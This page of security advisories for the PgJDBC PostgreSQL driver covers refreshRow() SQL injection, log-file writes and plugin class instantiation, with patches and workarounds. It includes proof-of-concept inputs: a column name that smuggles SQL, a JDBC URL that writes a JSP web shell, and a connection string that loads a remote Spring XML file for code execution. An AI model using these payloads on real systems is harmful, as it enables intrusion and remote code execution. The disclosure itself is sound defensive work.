---
title: "Security Advisories"
date: 2022-06-19T22:46:55+05:30
draft: false
---

### SQL Injection in ResultSet.refreshRow() with malicious column names

#### Impact

*What kind of vulnerability is it? Who is impacted?*

The PGJDBC implementation of the `java.sql.ResultRow.refreshRow()` method is not performing escaping of column names so a malicious column name that contains a statement terminator, e.g. ; , could lead to SQL injection. This could lead to executing additional SQL commands as the application's JDBC user.

User applications that do not invoke the `ResultSet.refreshRow()` method are not impacted.

User application that do invoke that method are impacted if the underlying database that they are querying via their JDBC application may be under the control of an attacker. The attack requires the attacker to trick the user into executing SQL against a table name who's column names would contain the malicious SQL and subsequently invoke the `refreshRow()` method on the ResultSet.

For example:

```sql
CREATE TABLE refresh_row_example (
  id     int PRIMARY KEY,
  "1 FROM refresh_row_example; SELECT pg_sleep(10); SELECT * " int
);
```

This example has a table with two columns. The name of the second column is crafted to contain a statement terminator followed by additional SQL. Invoking the `ResultSet.refreshRow()` on a ResultSet that queried this table, e.g. `SELECT * FROM refresh_row` , would cause the additional SQL commands such as the `SELECT pg_sleep(10)` invocation to be executed.

As the multi statement command would contain multiple results, it would not be possible for the attacker to get data directly out of this approach as the `ResultSet.refreshRow()` method would throw an exception. However, the attacker could execute any arbitrary SQL including inserting the data into another table that could then be read or any other DML / DDL statement.

Note that the application's JDBC user and the schema owner need not be the same. A JDBC application that executes as a privileged user querying database schemas owned by potentially malicious less-privileged users would be vulnerable. In that situation it may be possible for the malicious user to craft a schema that causes the application to execute commands as the privileged user.

#### Patches

*Has the problem been patched? What versions should users upgrade to?*

Yes, versions 42.2.26 and 42.4.1 have been released with a fix.

The 42.2.26 release was provided to support older clients that are still running JDK 6 or JDK 7 that cannot upgrade to the 42.4.x release line (which requires JDK 8+).

We are not releasing a version for the 43.3.x release line and users are advised to upgrade to the 42.4.1 release to get the fix.

#### Workarounds

*Is there a way for users to fix or remediate the vulnerability without upgrading?*

Check that you are not using the `ResultSet.refreshRow()` method.

If you are, ensure that the code that executes that method does not connect to a database that is controlled by an unauthenticated or malicious user. If your application only connects to its own database with a fixed schema with no DDL permissions, then you will not be affected by this vulnerability as it requires a maliciously crafted schema.

### Arbitrary File Write Vulnerability

#### Overview

The connection properties for configuring a pgjdbc connection are not meant to be exposed to an unauthenticated attacker. While allowing an attacker to specify arbitrary connection properties could lead to a compromise of a system, that's a defect of an application that allows unauthenticated attackers that level of control.

It's not the job of the pgjdbc driver to decide whether a given log file location is acceptable. End user applications that use the pgjdbc driver must ensure that filenames are valid and restrict unauthenticated attackers from being able to supply arbitrary values. That's not specific to the pgjdbc driver either, it would be true for any library that can write to the application's local file system.

While we do not consider this a security issue with the driver, we have decided to remove the loggerFile and loggerLevel connection properties in the next release of the driver. Removal of those properties does not make exposing the JDBC URL or connection properties to an attacker safe and we continue to suggest that applications do not allow untrusted users to specify arbitrary connection properties. We are removing them to prevent misuse and their functionality can be delegated to java.util.logging.

If you identify an application that allows remote users to specify a complete JDBC URL or properties without validating it's contents, we encourage you to notify the application owner as that may be a security defect in that specific application.

#### Impact

It is possible to specify an arbitrary filename in the loggerFileName connection parameter
 `"jdbc:postgresql://localhost:5432/test?user=test&password=test&loggerLevel=DEBUG&loggerFile=./blah.jsp&<%Runtime.getRuntime().exec(request.getParameter("i"));%>"`

This creates a valid JSP file which could lead to a Remote Code Execution

#### Patches

Problem has not been patched

#### Workarounds

sanitize the inputs to the driver

Reported by Allan Lou v3ged0ge@gmail.com

### Unchecked Class Instantiation when providing Plugin Classes

#### Impact

pgjdbc instantiates plugin instances based on class names provided via `authenticationPluginClassName`, `sslhostnameverifier`, `socketFactory`, `sslfactory`, `sslpasswordcallback` connection properties.

However, the driver did not verify if the class implements the expected interface before instantiating the class.

Here's an example attack using an out-of-the-box class from Spring Framework:

```java
DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support. ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");
```

The first impacted version is REL9.4.1208 (it introduced `socketFactory` connection property)
